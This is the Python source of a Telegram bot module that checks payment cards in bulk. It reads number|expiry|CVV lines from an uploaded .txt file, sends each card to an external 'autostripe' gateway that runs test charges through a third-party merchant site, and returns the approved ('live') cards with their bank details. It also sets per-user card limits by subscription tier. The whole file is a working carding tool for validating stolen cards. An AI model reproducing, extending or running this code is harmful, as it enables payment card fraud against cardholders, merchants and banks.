# mstripe.py
import asyncio, aiohttp, re, time, html, logging
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes, CallbackQueryHandler
from db import get_user, update_user
from bin import get_bin_info
import io, uuid

API_BASE = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=dilaboards.com/cc="

def escape_html(text): return html.escape(str(text))

# global tracker  {user_id: {stop:bool, live:int, dead:int, total:int, checked:int, msg_id:int}}
TASKS = {}

# Cooldown tracker {user_id: last_used_timestamp}
CHKTXT_COOLDOWNS = {}

# ---------- CC Limits based on user type ----------
def get_user_cc_limit(user_data, user_id, owner_id=7254736651, admin_ids=None):
    """
    Returns CC limit based on user type:
    - Owner: Unlimited (1000+)
    - Admin: 1000 CC
    - Premium: 400 CC  
    - Free: 300 CC
    """
    if admin_ids is None:
        admin_ids = {7254736651}  # Add your admin IDs here
    
    if user_id == owner_id:
        return float('inf')  # Unlimited for owner
    elif user_id in admin_ids:
        return 1000  # 1000 CC for admins
    elif user_data.get('plan', 'Free').lower() in ['premium', 'plus', 'gold', 'platinum']:
        return 400  # 400 CC for premium users
    else:
        return 300  # 300 CC for free users

# ---------- single card ----------
async def chk_single(card: str):
    start = time.time()
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=35)) as s:
            async with s.get(API_BASE + card) as r:
                txt = await r.text()
    except Exception as e:
        return None, str(e), round(time.time()-start, 2)
    if "approved" in txt.lower() or "success" in txt.lower() or "thank" in txt.lower():
        return "APPROVED", txt[:60], round(time.time()-start, 2)
    return "DECLINED", txt[:60], round(time.time()-start, 2)

# ---------- build inline buttons ----------
def build_buttons(user_id):
    t = TASKS.get(user_id, {})
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"𝘾𝙪𝙧𝙧𝙚𝙣𝙩 ➜ {t.get('current','')}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ➜ {t.get('live',0)}", callback_data="noop"),
            InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➜ {t.get('dead',0)}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"⏳ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙩 ➜ {t.get('checked',0)}/{t.get('total',0)}", callback_data="noop"),
        ],
        [InlineKeyboardButton("☑️ 𝙎𝙏𝙊𝙋", callback_data=f"stopchk_{user_id}")],
    ])

# ---------- extract cards from text ----------
def extract_cards(text: str) -> list[str]:
    """Extract card patterns from text"""
    pattern = r'\b\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b'
    return re.findall(pattern, text)

# ---------- background worker ----------
async def process_txt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    OWNER_ID = 7254736651
    ADMIN_IDS = {7254736651}  # Add your admin IDs here

    # ✅ COOLDOWN CHECK FOR FREE USERS ✅
    user_data = await get_user(uid)
    if not user_data:
        await msg.reply_text("❌ User data not found.")
        return

    # Check if user is free user
    user_plan = user_data.get('plan', 'Free')
    is_free_user = user_plan.lower() == 'free'
    
    if is_free_user:
        current_time = time.time()
        last_used = CHKTXT_COOLDOWNS.get(uid, 0)
        cooldown_seconds = 300  # 5 minutes
        
        if current_time - last_used < cooldown_seconds:
            remaining = int(cooldown_seconds - (current_time - last_used))
            minutes = remaining // 60
            seconds = remaining % 60
            await msg.reply_text(
                f"⏳ 𝙁𝙧𝙚𝙚 𝙐𝙨𝙚𝙧 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣\n\n"
                f"⚠️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {minutes}𝙢 {seconds}𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙪𝙨𝙞𝙣𝙜 /𝙘𝙝𝙠𝙩𝙭𝙩 𝙖𝙜𝙖𝙞𝙣\n"
                f"💡 𝙐𝙥𝙜𝙧𝙖𝙙𝙚 𝙩𝙤 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙛𝙤𝙧 𝙣𝙤 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣"
            )
            return
        
        # Set cooldown for free user
        CHKTXT_COOLDOWNS[uid] = current_time

    # download & parse
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text("❌ Reply to a .txt file.\nUsage: <code>/chktxt</code>", parse_mode=ParseMode.HTML)
        return
    
    doc = msg.reply_to_message.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("❌ Only .txt files accepted.")
        return
    
    file_io = io.BytesIO()
    await (await doc.get_file()).download_to_memory(file_io)
    file_io.seek(0)
    cards = extract_cards(file_io.read().decode("utf-8", errors="ignore"))
    
    if not cards:
        await msg.reply_text("❌ No valid cards found in the file.")
        return

    # ✅ CC LIMIT CHECK ✅
    cc_limit = get_user_cc_limit(user_data, uid, OWNER_ID, ADMIN_IDS)
    total_cards = len(cards)
    
    # Determine how many cards to process
    if total_cards <= cc_limit:
        # User within limit - process all cards
        cards_to_process = total_cards
        limit_message = f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n🔥 𝘼𝙡𝙡 {total_cards} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"
    else:
        # User exceeds limit - process only up to limit
        cards_to_process = cc_limit
        limit_message = f"📝 𝙁𝙤𝙪𝙣𝙙 {total_cards} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚\n⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)\n🔥 {cc_limit} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙"

    # ✅ SEND LIMIT INFO MESSAGE ✅
    await msg.reply_text(limit_message)

    # ✅ NO CREDITS DEDUCTION - COMPLETELY FREE ✅

    # Use only the cards we're going to process
    cards = cards[:cards_to_process]

    # init tracker
    TASKS[uid] = {"stop": False, "live": 0, "dead": 0, "total": cards_to_process, "checked": 0, "current": "", "msg_id": None}

    # send board
    board = await msg.reply_text("⏳ Starting...", reply_markup=build_buttons(uid))
    TASKS[uid]["msg_id"] = board.id

    live_cards = []

    for idx, card in enumerate(cards):
        if TASKS[uid]["stop"]:
            break
        TASKS[uid]["current"] = card
        TASKS[uid]["checked"] = idx + 1
        # update board every 5 cards
        if idx % 5 == 0:
            try:
                await board.edit_text("⏳ Running...", reply_markup=build_buttons(uid))
            except: pass

        status, resp, took = await chk_single(card)
        if status == "APPROVED":
            TASKS[uid]["live"] += 1
            # send live card instantly
            bin_info = await get_bin_info(card[:6])
            txt = (
                f"<b><i>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅</i></b>\n\n"
                f"𝗖𝗖 ⇾ <code>{escape_html(card)}</code>\n"
                f"𝗚𝗮𝘁𝙚𝙬𝙖𝙮 ⇾ Stripe Auth\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗣𝙣𝙨𝙚 ⇾ <code>{escape_html(resp)}</code>\n\n"
                f"<pre>"
                f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜ {escape_html(bin_info.get('scheme','N/A'))}\n"
                f"𝗕𝗮𝗻𝗸 ➜ {escape_html(bin_info.get('bank','N/A'))}\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜ {escape_html(bin_info.get('country','Unknown'))} {bin_info.get('country_emoji','')}"
                f"</pre>\n\n"
                f"𝗧𝗼𝗼𝗸 {took} seconds"
            )
            await msg.reply_text(txt, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            live_cards.append(card)
        else:
            TASKS[uid]["dead"] += 1

    # final board
    try:
        await board.edit_text("✅ Finished", reply_markup=build_buttons(uid))
    except: pass

    # live file
    if live_cards:
        out = io.BytesIO("\n".join(live_cards).encode())
        out.name = f"Live_x{len(live_cards)}.txt"
        await msg.reply_document(document=InputFile(out),
                                 caption=f"✅ Live cards – {len(live_cards)}/{cards_to_process} checked",
                                 parse_mode=ParseMode.HTML)

    # cleanup
    TASKS.pop(uid, None)

# ---------- stop callback ----------
async def stopchk_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data or ""
    if data.startswith("stopchk_"):
        target = int(data.split("_",1)[1])
        if uid != target:
            await query.answer("❌ Not your task!", show_alert=True)
            return
        if uid in TASKS:
            TASKS[uid]["stop"] = True
            await query.answer("⏹ Stopped!", show_alert=True)

# ---------- command entry ----------
async def chktxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    asyncio.create_task(process_txt_file(update, context))

# ---------- register callback ----------
def register_mstripe_callbacks(app):
    app.add_handler(CallbackQueryHandler(stopchk_callback, pattern="^stopchk_"))